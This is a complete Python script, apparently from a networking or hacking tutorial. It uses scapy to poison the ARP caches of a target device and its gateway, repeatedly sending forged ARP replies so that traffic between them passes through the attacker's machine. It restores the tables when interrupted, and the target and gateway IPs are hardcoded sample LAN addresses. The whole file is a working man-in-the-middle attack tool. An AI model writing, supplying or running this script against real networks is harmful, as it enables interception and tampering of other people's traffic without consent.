import scapy.all as scapy
import time
import sys

def get_mac(ip):
    """
    Gets the MAC address for a given IP address.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # Send the packet and get the first response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """
    Sends a single crafted ARP reply to trick the target.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not get MAC address for {target_ip}. Exiting.")
        sys.exit()
        
    # op=2 means an ARP "reply" (as opposed to op=1 which is a "request")
    # pdst = destination IP, hwdst = destination MAC
    # psrc = source IP (the IP we are pretending to be)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restores the network by sending correct ARP packets.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # Sending the packet 4 times to ensure the cache is restored
    scapy.send(packet, count=4, verbose=False)

def main(target_ip, gateway_ip):
    """
    Main loop to continuously poison the ARP caches.
    """
    sent_packets_count = 0
    try:
        print("[*] Starting ARP spoofer... Press Ctrl+C to stop and restore.")
        while True:
            # Tell the target that we are the gateway
            spoof(target_ip, gateway_ip)
            # Tell the gateway that we are the target
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            time.sleep(2) # Wait 2 seconds between sending packets
    except KeyboardInterrupt:
        print("\n[*] Detected Ctrl+C ... Restoring ARP tables. Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] ARP tables restored. Quitting.")

if __name__ == "__main__":
    # --- IMPORTANT: Replace with your network's IPs ---
    target_ip = "192.168.0.173"  # IP of the device you want to target
    gateway_ip = "192.168.0.1"  # IP of your router
    
    main(target_ip, gateway_ip)